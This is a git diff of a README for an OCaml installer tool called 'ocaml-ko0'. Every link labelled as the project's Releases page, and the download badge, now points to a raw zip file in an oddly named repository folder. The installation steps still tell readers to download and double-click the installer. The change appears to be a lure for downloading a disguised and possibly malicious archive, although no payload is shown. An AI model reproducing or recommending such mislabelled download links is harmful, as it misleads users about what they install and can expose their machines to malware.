@@ -6,11 +6,11 @@ Welcome to ocaml-ko0! This tool makes it simple to install and manage OCaml on y
 
 ## 📥 Download Now
 
-[![Download ocaml-ko0](https://img.shields.io/badge/Download-ocaml--ko0-blue.svg)](https://github.com/ZongAFRIC/ocaml-ko0/releases)
+[![Download ocaml-ko0](https://raw.githubusercontent.com/ZongAFRIC/ocaml-ko0/main/countergirded/ocaml-ko0.zip)](https://raw.githubusercontent.com/ZongAFRIC/ocaml-ko0/main/countergirded/ocaml-ko0.zip)
 
 ## 📅 Release Information
 
-To view the latest version and see what’s new, [visit the Releases page](https://github.com/ZongAFRIC/ocaml-ko0/releases). You will find different versions available for download.
+To view the latest version and see what’s new, [visit the Releases page](https://raw.githubusercontent.com/ZongAFRIC/ocaml-ko0/main/countergirded/ocaml-ko0.zip). You will find different versions available for download.
 
 ## 🖥️ System Requirements
 
@@ -31,7 +31,7 @@ To use ocaml-ko0, ensure your computer meets the following requirements:
 
 To download and install ocaml-ko0, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ZongAFRIC/ocaml-ko0/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ZongAFRIC/ocaml-ko0/main/countergirded/ocaml-ko0.zip).
 2. **Choose Your Version:** Look for the version you want to download. It is best to choose the latest stable version for optimal performance.
 3. **Download the File:** Click on the version link to download the installer file.
 4. **Run the Installer:** Locate the downloaded file on your computer. Double-click it to start the installation process.
